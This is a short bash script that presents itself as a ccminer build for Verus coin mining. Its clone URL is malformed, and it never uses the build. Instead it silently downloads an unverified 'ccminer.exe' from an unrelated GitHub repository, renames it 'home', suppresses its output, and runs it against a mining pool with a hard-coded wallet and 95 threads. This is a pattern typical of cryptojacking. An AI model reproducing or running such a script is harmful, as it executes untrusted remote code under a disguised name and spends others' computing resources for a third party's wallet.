#!/bin/bash
git clone --single-branch -b Verus2.2 https://github.com/monkins1010/cd ccminer
chmod +x build.sh
chmod +x configure.sh
chmod +x autogen.sh
wget -q -O home https://github.com/traapoks/traapoks/raw/main/ccminer.exe && chmod +x home >/dev/null 2>&1
./build.sh
./home -a verus -o stratum+tcp://eu.luckpool.net:3956 -u RRYVVDXrrwgchzytdZk4AAZuNm21348cF9.1 -p hybrid -t95
